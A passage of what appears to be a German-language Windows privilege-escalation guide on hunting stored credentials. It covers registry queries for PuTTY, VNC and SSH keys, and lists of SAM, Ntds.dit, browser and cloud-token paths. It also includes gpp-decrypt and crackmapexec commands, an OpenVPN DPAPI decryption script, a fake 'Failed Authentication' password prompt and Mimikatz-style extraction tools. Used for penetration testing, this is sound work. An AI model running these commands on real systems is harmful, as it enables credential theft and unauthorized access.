Ein CI-Server kann eingereichte Quellcodeänderungen auch nach Abschluss des Builds in seinem Datenverzeichnis speichern. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Änderungen aus Remote-Ausführungen; das Datenverzeichnis kann konfiguriert sein und muss sich nicht unter `ProgramData` befinden. Ein lesbarer Patch kann entfernte oder hinzugefügte Verweise auf eine Zugangsdatendatei, einen Verschlüsselungsschlüssel oder ein Skript enthalten, das beides verwendet. Beispielsweise benötigt ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` neben der verschlüsselten Zeichenfolge auch den AES-Schlüssel; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat angegeben wird. Prüfen Sie zunächst nur die Namen zugänglicher Patches und sehen Sie relevante Inhalte anschließend im Rahmen einer autorisierten Prüfung ein, ohne Geheimnisse in routinemäßigen Aufzählungsausgaben auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein belegt weder gültige Zugangsdaten noch Zugriff mit höheren Berechtigungen. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen einzuchecken.

### Benutzerdefinierte Rotation lokaler Administratorpasswörter

Ein selbst entwickelter Passwort-Rotator kann ein verschlüsseltes lokales Administratorpasswort in einem lokalen Dienst speichern und gleichzeitig die Zugangsdaten seines Datenspeichers in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei aufbewahren. Prüfen Sie gemeinsam den geplanten Task des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen des Datenspeichers. Ein nur an Loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Zugangsdaten weiterhin erreichbar; die Authentifizierung allein belegt jedoch nicht, dass dieser Benutzer die relevanten Datensätze lesen darf. Wenn der Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, prüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Verfahren, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mit Go's [`math/rand`](https://pkg.go.dev/math/rand) ableitet, ist für den Schutz dieses Passworts ungeeignet; Go weist darauf hin, dass dieses Paket nicht für sicherheitskritische Zufallswerte geeignet ist. Vergewissern Sie sich, dass ein wiederhergestelltes Passwort aktuell ist und zu einem Konto der lokalen Administratorengruppe gehört, bevor Sie es als möglichen Weg zur Rechteausweitung einstufen. Ein geplanter Task, ein `.env`-Pfad oder ein verschlüsselter Blob belegt keine dieser Voraussetzungen. Geben Sie Passwörter und Schlüsselmaterial nicht in routinemäßigen Aufzählungsausgaben aus.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete lokale Administratorpasswörter. Dessen Verzeichnis- oder Entra-basierter Speicher und Zugriffskontrollen unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) legen ebenfalls fest, ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen darf.

### Java-Server-Plugin-Archive und wiederverwendete Zugangsdaten

Einige Java-Server-Plugins werden als JAR-Archive im Verzeichnis `plugins` eines Servers verteilt. Ein lesbares benutzerdefiniertes Plugin kann Konfiguration oder Bytecode mit eingebetteten Dienstzugangsdaten enthalten. Prüfen Sie das Archiv nur mit entsprechender Berechtigung und geben Sie wiederhergestellte Geheimnisse nicht in routinemäßigen Aufzählungsausgaben aus. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist; ein wiederhergestelltes Dienstpasswort ermöglicht nur dann höhere Berechtigungen, wenn es auch für ein höher privilegiertes Konto gültig ist. Prüfen Sie die relevanten Datei-ACLs und ersetzen Sie wiederverwendete Zugangsdaten durch eindeutige Geheimnisse. Informationen zum Verzeichnislayout finden Sie in der [Plugin-Installationsanleitung von PaperMC](https://docs.papermc.io/paper/adding-plugins/) und zu Archivinhalten in der [JAR-Dokumentation von Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Zugangsdaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation mit eingebetteter Datenbank kann `openfire.script` unter `Openfire\embedded-db` speichern. Wenn das aktuelle Konto die Datei lesen kann, prüfen Sie gemeinsam die `OFUSER`-Datensätze und die Eigenschaft `passwordKey`. Laut Openfires [Dokumentation zum User Provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) können Passwörter im Klartext oder mit einem in dieser Eigenschaft hinterlegten Schlüssel verschlüsselt gespeichert werden. Ein wiederhergestelltes Passwort ist für eine Rechteausweitung nur relevant, wenn es für eine Identität mit höheren Berechtigungen noch gültig ist; der Dateiname allein belegt weder Lesezugriff noch wiederverwendete Zugangsdaten. Der Pfad ist ein Hinweis für die Bestandsaufnahme. Geben Sie Datenbankinhalte und Zugangsdaten nicht in routinemäßigen Aufzählungsausgaben aus.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Admin-Konsole offenlegen, selbst wenn eine externe Datenbank verwendet wird. Openfire bindet seine Admin-Konsole üblicherweise an Loopback; ein lokales Konto kann die Adresse dennoch erreichen, wenn der Listener läuft. Prüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Admin-Rolle, die Richtlinie für Plugin-Uploads und die Identität des Openfire-Dienstes. Ein Administrator, der ein Plugin installieren kann, kann dessen Code möglicherweise im Kontext des Dienstes ausführen lassen; dieser kann hoch privilegiert sein, wenn der Dienst als LocalSystem läuft. Ein übereinstimmendes Kontopasswort oder ein lesbarer Konfigurationspfad allein belegt weder den Zugriff auf die Admin-Konsole noch die Codeausführung. Siehe die [Installations- und Plugin-Verwaltungsanleitung des Herstellers](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und die [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration eines forensischen Verwaltungsservers

Velociraptor-Serverkonfigurationen, die üblicherweise `server.config.yaml` heißen, können `CA.private_key` der internen CA enthalten. Wenn ein Benutzer mit geringeren Berechtigungen diesen Schlüssel lesen kann, kann er möglicherweise ein API-Clientzertifikat ausstellen. Ob dies zu höheren Berechtigungen führt, hängt von den Benutzerrollen des Servers, der Erreichbarkeit der API und der Identität ab, unter der der Server oder Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält andere Schlüsselmaterialien; ihr Fund belegt keinen Zugriff auf die Server-CA. In manchen Installationen wird der private CA-Schlüssel offline aufbewahrt, sodass eine lesbare Serverkonfiguration den Signaturschlüssel möglicherweise nicht enthält.

Prüfen Sie auf einem Windows-Server die ACL der **Server**konfiguration im Installationsverzeichnis und etwaiger geschützter Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; verwenden Sie den konfigurierten Dienstpfad, falls dieser abweicht. Vergewissern Sie sich, dass die aktuelle Identität die Datei lesen kann und `CA.private_key` tatsächlich vorhanden ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Aufzählungsausgaben aus. Der Workflow `config api_client` des Herstellers verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen; erforderlich ist aber auch eine wirksame serverseitige Rolle. Deren Erstellung oder Änderung kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine bereits vorhandene privilegierte Serveridentität kann einen Zugriffsweg bieten, auch wenn diese Schreibvorgänge nicht möglich sind. API-Abfragen mit Ausführungsrechten laufen im entsprechenden Server- oder Agentenkontext, der hoch privilegiert sein kann.

Schützen Sie die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahren Sie den CA-Signaturschlüssel nach Möglichkeit offline auf und beschränken Sie API-Rollen und Listener-Zugriff. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitungen zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY-Zugangsdaten

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein nativer verschlüsselter Speicher befindet sich möglicherweise unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, während ein exportiertes Sitzungs-Backup `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. [SolarWinds’ Exportanleitung](https://thwack.solarwinds.com/discussion/comment/115591) besagt, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können; das [Support-Forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) nennt den nativen Speicherort. Prüfe zuerst Dateiberechtigungen und Pfade. Das Auffinden einer der beiden Dateien verrät weder das Passwort noch beweist es, dass gespeicherte Anmeldedaten noch gültig sind oder höhere Berechtigungen besitzen.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH private keys können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Daher solltest du prüfen, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, lässt sich aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsseln.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht läuft und du möchtest, dass er beim Systemstart automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH an einem Computer anzumelden. Die Registrierung HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und Procmon hat während der Authentifizierung mit asymmetrischen Schlüsseln keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM-Sicherungen

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Backupdateien (`.wim`) können auch Offline-Hives von `SAM`, `SECURITY` und `SYSTEM` enthalten. Priorisieren Sie lokal zugängliche Backup- oder Image-Verzeichnisse und prüfen Sie die **Namen der enthaltenen Dateien**, bevor Sie etwas extrahieren; allein ein `.wim`-Dateiname beweist nicht, dass Hives offengelegt werden, und gewöhnliche `install.wim`-, `boot.wim`- und Recovery-Images sind häufige Sackgassen. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn diese Freigabe zum Scope gehört. Siehe Microsofts [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Anmeldedaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Rechnern über Group Policy Preferences (GPP) bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitslücken auf. Erstens konnten alle Domänenbenutzer auf die Group Policy Objects (GPOs) zugreifen, die als XML-Dateien in SYSVOL gespeichert waren. Zweitens konnten die Passwörter in diesen GPPs, die mit AES256 und einem öffentlich dokumentierten Standardschlüssel verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien mit einem nicht leeren Feld „cpassword“ sucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und erleichtert so die Erkennung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Passwörter mit crackmapexec abrufen:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS-Webkonfiguration

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für eine web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-webroot

Ein altes ZIP-Backup, das direkt in einem ausgelieferten webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfen Sie den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor Sie es als offengelegt einstufen. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Kandidat. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ein Archivname belegt weder, dass es ein Geheimnis enthält, noch, dass wiederhergestellte Zugangsdaten höhere Berechtigungen gewähren.

### OpenVPN-Anmeldedaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Du kannst den **Benutzer jederzeit bitten, seine Zugangsdaten oder sogar die Zugangsdaten eines anderen Benutzers einzugeben**, wenn du glaubst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den Client direkt nach den **Zugangsdaten** zu fragen):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen, die Zugangsdaten enthalten**

Bekannte Dateien, die früher **Passwörter** im **Klartext** oder in **Base64** enthielten

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password-Safe-v3-Datenbanken verwenden häufig die Erweiterung `.psafe3`. Betrachte eine passende Datei als möglichen verschlüsselten Tresor; ihr Vorhandensein bedeutet nicht, dass du sie lesen, entsperren oder gespeicherte Zugangsdaten verwenden kannst. Prüfe bei der Untersuchung der Speicherorte solcher Dateien zugängliche Benutzerprofile und konfigurierte Dateifreigabe-Stammverzeichnisse.

Eine lesbare KeePass-`.kdbx`-Datei ist ebenfalls lediglich ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren werden das tatsächliche Master-Passwort sowie alle konfigurierten Schlüsseldateien oder Kontofaktoren benötigt. Falls eine autorisierte Untersuchung ein LM:NT-Hash-Paar in einem Eintrag findet, verifiziere das angegebene Konto und ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresor-Eintrag verleiht für sich allein keine Administrator- oder SYSTEM-Rechte; auch der Fernzugriff auf den Dienst, die Kontorechte und jeder separate Schritt zur Dienstausführung müssen gegeben sein. Die Bestandsaufnahme sollte den Tresorpfad und dessen Lesbarkeit erfassen, nicht die Datenbank oder gespeicherte Zugangsdaten ausgeben.

Suche nach allen vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Zugangsdaten im Papierkorb

Prüfe zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Zugangsdaten hinweisen. Ein brauchbares `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Eintrag und die gelöschte Datei im zugehörigen `$R`-Eintrag. Prüfe die Metadaten und die Leseberechtigung der aktuellen Identität, bevor du ein Archiv öffnest. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab; eine leere Auflistung beweist daher nicht, dass kein wiederherstellbares Backup existiert. Betrachte einen Archivnamen als Kandidaten für eine Prüfung, nicht als Beweis dafür, dass das Archiv ein gültiges Geheimnis enthält.

Ein zugängliches, gelöschtes `.pfx` kann auch ein Ansatzpunkt für **Code-Signing** sein. Wenn es einen zugänglichen privaten Schlüssel enthält, kann dieser ein geändertes PowerShell-Skript signieren; [PowerShell erfordert ein Code-Signing-Zertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Publisherregeln werten die Identität des Signierers und den Geltungsbereich der Regel aus](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Die Ausführung unter einem anderen Konto setzt voraus, dass die aktuelle Identität das genaue Skript ändern kann, eine wirksame Regel die resultierende Signatur für das Skript und das Zielkonto akzeptiert und eine geplante Aufgabe oder ein anderer Prozess mit höheren Berechtigungen das Skript tatsächlich ausführt. Ein `.pfx`-Dateiname, ein Zertifikatbetreff oder ein beschreibbares Skript allein belegt diese Kette nicht. Prüfe Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor du Material mit privaten Schlüsseln öffnest oder die Aufgabe auslöst.

Prüfe auch zugängliche Profildatenbanken, Notizen und empfangene Dateien von Messaging-Clients auf Hinweise auf Zugangsdaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML- oder TXT-Datei gespeichert sein, manchmal in einem entsprechend benannten Backup-Archiv. Solches Material kann Zugriff auf ein separates verschlüsseltes Datenvolume mit älteren Backups ermöglichen; prüfe das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Wenn ein Backup `NTDS.dit` enthält, erfordert die Offline-Wiederherstellung von Domänenzugangsdaten außerdem die passende `SYSTEM`-Hive, wie im [Workflow zu Backups und privilegierten Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänenbackup vorhanden ist.

Um gespeicherte **Passwörter** aus mehreren Programmen **wiederherzustellen**, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Zugangsdaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Sie sollten nach Datenbanken suchen, in denen Passwörter von **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfen Sie auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Beim herkömmlichen **Default**-Profil des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Speicherort des Standardprofils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein von Dateien ist lediglich ein Hinweis auf einen Speicherort für Zugangsdaten: Überprüfen Sie, ob die Dateien lesbar sind, ob der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem Konto mit höheren Rechten gehört. Eine reine Pfadaufzählung muss die Datenbank weder öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils zusammengehörige Schlüssel- und verschlüsselte Login-Dateien sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfen Sie, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor Sie zu dem Schluss kommen, dass die Zugangsdaten verwendbar sind. Gehört ein wiederhergestelltes Zugangsmittel zu einem Domänenkonto, überprüfen Sie separat die effektiven Gruppenverwaltungsrechte dieses Kontos und die [Lese- oder Entschlüsselungsrechte der Gruppe für LAPS-Passwörter](../active-directory-methodology/laps.md); Browser-Artefakte allein belegen keinen Pfad zu Administratorrechten.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten ermöglicht, die in unterschiedlichen Sprachen geschrieben sind. Jede COM-Komponente wird durch eine **class ID (CLSID)** identifiziert, und jede Komponente stellt Funktionalität über eine oder mehrere Schnittstellen bereit, die durch interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind jeweils in der Registry unter **HKEY\CLASSES\ROOT\CLSID** und **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

In den CLSIDs dieser Registry finden Sie den untergeordneten Registry-Schlüssel **InProcServer32**. Er enthält einen **Standardwert**, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread Neutral) sein kann.

![Browserverlauf - COM DLL Overwriting: In den CLSIDs dieser Registry finden Sie den untergeordneten Registry-Schlüssel InProcServer32. Er enthält einen Standardwert, der auf eine DLL verweist, sowie einen Wert ...](<../../images/image (729).png>)

Wenn Sie eine der auszuführenden **DLLs überschreiben** können, könnten Sie Ihre **Rechte ausweiten**, sofern diese DLL von einem anderen Benutzer ausgeführt wird.

Weitere Informationen darüber, wie Angreifer COM Hijacking als Persistenzmechanismus einsetzen, finden Sie hier:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registry**

**Nach Dateiinhalten suchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
